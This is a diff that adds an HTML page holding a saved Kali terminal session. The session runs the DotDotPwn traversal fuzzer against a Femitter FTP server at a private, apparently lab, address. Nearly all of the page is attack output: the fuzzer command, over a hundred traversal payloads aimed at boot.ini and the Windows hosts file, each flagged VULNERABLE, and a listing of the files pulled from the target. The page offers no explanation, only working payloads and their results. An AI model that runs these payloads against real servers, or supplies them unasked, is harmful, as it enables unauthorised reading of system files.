@@ -1,0 +1,394 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>dotdotpwn</title>
+</head><body>root@kali:/usr/share/dotdotpwn# dotdotpwn.pl -h 10.11.1.125 -m ftp -t 300 -s -q -k timeout<br/>
+#################################################################################<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
+# &nbsp;CubilFelino &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Chatsubo &nbsp; #<br/>
+# &nbsp;Security Research Lab &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;and &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[(in)Security Dark] Labs &nbsp; #<br/>
+# &nbsp;chr1x.sectester.net &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chatsubo-labs.blogspot.com &nbsp; #<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pr0udly present: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
+# &nbsp;________ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__ &nbsp;________ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__ &nbsp;__________ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
+# &nbsp;\______ \ &nbsp; &nbsp;____ _/ &nbsp;|_\______ \ &nbsp; &nbsp;____ _/ &nbsp;|_\______ &nbsp; \__ &nbsp;_ &nbsp;__ ____ &nbsp; &nbsp;#<br/>
+# &nbsp; | &nbsp; &nbsp;| &nbsp;\ &nbsp;/ &nbsp;_ \\ &nbsp; __\| &nbsp; &nbsp;| &nbsp;\ &nbsp;/ &nbsp;_ \\ &nbsp; __\| &nbsp; &nbsp; ___/\ \/ \/ // &nbsp; &nbsp;\ &nbsp; #<br/>
+# &nbsp; | &nbsp; &nbsp;` &nbsp; \( &nbsp;&lt;_&gt; )| &nbsp;| &nbsp;| &nbsp; &nbsp;` &nbsp; \( &nbsp;&lt;_&gt; )| &nbsp;| &nbsp;| &nbsp; &nbsp;| &nbsp; &nbsp; \ &nbsp; &nbsp; /| &nbsp; | &nbsp;\ &nbsp;#<br/>
+# &nbsp;/_______ &nbsp;/ \____/ |__| /_______ &nbsp;/ \____/ |__| &nbsp;|____| &nbsp; &nbsp; &nbsp;\/\_/ |___| &nbsp;/ &nbsp;#<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp; #<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - DotDotPwn v3.0 - &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; The Directory Traversal Fuzzer &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; http://dotdotpwn.sectester.net &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dotdotpwn@sectester.net &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; by chr1x &amp; nitr0us &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#<br/>
+#################################################################################<br/>
+<br/>
+[+] Report name: Reports/10.11.1.125_02-10-2017_19-13.txt<br/>
+<br/>
+[========== TARGET INFORMATION ==========]<br/>
+[+] Hostname: 10.11.1.125<br/>
+[+] Protocol: ftp<br/>
+[+] Port: 21<br/>
+[+] Service detected:<br/>
+220 Femitter FTP Server ready.<br/>
+<br/>
+[=========== TRAVERSAL ENGINE ===========]<br/>
+[+] Creating Traversal patterns (mix of dots and slashes)<br/>
+[+] Multiplying 6 times the traversal patterns (-d switch)<br/>
+[+] Creating the Special Traversal patterns<br/>
+[+] Translating (back)slashes in the filenames<br/>
+[+] Adapting the filenames according to the OS type detected (generic)<br/>
+<br/>
+[+] Including Special sufixes<br/>
+[+] Traversal Engine DONE ! - Total traversal tests created: 19680<br/>
+<br/>
+[=========== TESTING RESULTS ============]<br/>
+[+] Ready to launch 3.33 traversals per second<br/>
+[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)<br/>
+[+] Username: anonymous<br/>
+[+] Password: dot@dot.pwn<br/>
+[+] Connecting to the FTP server at '10.11.1.125' on port 21<br/>
+[+] FTP Server's Current Path: /C:/Program Files/Femitter/Shared<br/>
+[+] Local Path to download files: /usr/share/dotdotpwn<br/>
+[+] Press Enter to continue<br/>
+<br/>
+[+] Testing ...<br/>
+. <br/>
+[*] GET ../../../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../../../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ../../../../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../../../../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../../../../../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../../../../../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../../../../../../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../../../../../../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\..\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\..\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\..\..\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\..\..\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\..\..\..\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\..\..\..\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\..\..\..\..\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\..\..\..\..\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . <br/>
+[*] GET ..//..//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..//..//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..//..//..//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..//..//..//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..//..//..//..//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..//..//..//..//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..//..//..//..//..//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..//..//..//..//..//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..///..///..///boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..///..///..///windows///system32///drivers///etc///hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..///..///..///..///boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..///..///..///..///windows///system32///drivers///etc///hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..///..///..///..///..///boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..///..///..///..///..///windows///system32///drivers///etc///hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..///..///..///..///..///..///boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..///..///..///..///..///..///windows///system32///drivers///etc///hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\\..\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\..\\..\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\..\\..\\..\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\\..\\..\\..\\..\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\\\..\\\..\\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\\..\\\..\\\..\\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\\..\\\..\\\..\\\..\\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\\..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\\..\\\..\\\..\\\..\\\..\\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\\\..\\\..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ../\../\../\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\../\../\windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\../\../\../\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\../\../\../\windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ../\../\../\../\../\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\../\../\../\../\windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\../\../\../\../\../\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\../\../\../\../\../\windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\/..\/..\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/..\/..\/windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/..\/..\/..\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/..\/..\/..\/windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/..\/..\/..\/..\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/..\/..\/..\/..\/windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/..\/..\/..\/..\/..\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/..\/..\/..\/..\/..\/windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ../\/../\/../\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\/../\/../\/windows/\/system32/\/drivers/\/etc/\/hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ../\/../\/../\/../\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\/../\/../\/../\/windows/\/system32/\/drivers/\/etc/\/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\/../\/../\/../\/../\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\/../\/../\/../\/../\/windows/\/system32/\/drivers/\/etc/\/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\/../\/../\/../\/../\/../\/boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ../\/../\/../\/../\/../\/../\/windows/\/system32/\/drivers/\/etc/\/hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\/\..\/\..\/\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/\..\/\..\/\windows\/\system32\/\drivers\/\etc\/\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/\..\/\..\/\..\/\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/\..\/\..\/\..\/\windows\/\system32\/\drivers\/\etc\/\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/\..\/\..\/\..\/\..\/\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/\..\/\..\/\..\/\..\/\windows\/\system32\/\drivers\/\etc\/\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET ..\/\..\/\..\/\..\/\..\/\..\/\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ..\/\..\/\..\/\..\/\..\/\..\/\windows\/\system32\/\drivers\/\etc\/\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET \../\../\../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET \../\../\../windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET \../\../\../\../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET \../\../\../\../windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET \../\../\../\../\../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET \../\../\../\../\../windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET \../\../\../\../\../\../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET \../\../\../\../\../\../windows/\system32/\drivers/\etc/\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET /..\/..\/..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET /..\/..\/..\windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET /..\/..\/..\/..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET /..\/..\/..\/..\windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET /..\/..\/..\/..\/..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET /..\/..\/..\/..\/..\windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET /..\/..\/..\/..\/..\/..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET /..\/..\/..\/..\/..\/..\windows\/system32\/drivers\/etc\/hosts &lt;- VULNERABLE!<br/>
+. . . . . . <br/>
+[*] GET ./.././.././../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ./.././.././../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ./.././.././.././../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ./.././.././.././../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ./.././.././.././.././../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ./.././.././.././.././../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ./.././.././.././.././.././../boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET ./.././.././.././.././.././../windows/system32/drivers/etc/hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET .\..\.\..\.\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\..\.\..\.\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\..\.\..\.\..\.\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\..\.\..\.\..\.\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET .\..\.\..\.\..\.\..\.\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\..\.\..\.\..\.\..\.\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\..\.\..\.\..\.\..\.\..\.\..\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\..\.\..\.\..\.\..\.\..\.\..\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET .//..//.//..//.//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .//..//.//..//.//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .//..//.//..//.//..//.//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .//..//.//..//.//..//.//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .//..//.//..//.//..//.//..//.//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .//..//.//..//.//..//.//..//.//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .//..//.//..//.//..//.//..//.//..//.//..//boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .//..//.//..//.//..//.//..//.//..//.//..//windows//system32//drivers//etc//hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET .\\..\\.\\..\\.\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+. <br/>
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini &lt;- VULNERABLE!<br/>
+<br/>
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts &lt;- VULNERABLE!<br/>
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . <br/>
+[+] Fuzz testing finished after 169.48 minutes (10169 seconds)<br/>
+[+] Total Traversals found: 128<br/>
+[+] Report saved: Reports/10.11.1.125_02-10-2017_19-13.txt<br/>
+root@kali:/usr/share/dotdotpwn# ls<br/>
+\boot.ini &nbsp;boot.ini &nbsp;DotDotPwn &nbsp;dotdotpwn.pl &nbsp;hosts &nbsp;\hosts<br/>
+root@kali:/usr/share/dotdotpwn# ls -la<br/>
+total 220<br/>
+drwxr-xr-x &nbsp; 3 root root &nbsp;4096 Feb 10 21:58 .<br/>
+drwxr-xr-x 448 root root 16384 Jan &nbsp;1 13:26 ..<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 19:13 ..\..\..\..\..\..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 19:13 ..\..\..\..\..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 19:13 ..\..\..\..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 19:13 ..\..\..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\..\\..\\..\\..\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\..\\..\\..\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\..\\..\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\..\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\\..\\\..\\\..\\\..\\\..\\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\\..\\\..\\\..\\\..\\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\\..\\\..\\\..\\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:55 ..\\\..\\\..\\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:56 ..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\..\.\..\.\..\.\..\.\..\.\..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\..\.\..\.\..\.\..\.\..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\..\.\..\.\..\.\..\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\..\.\..\.\..\boot.ini<br/>
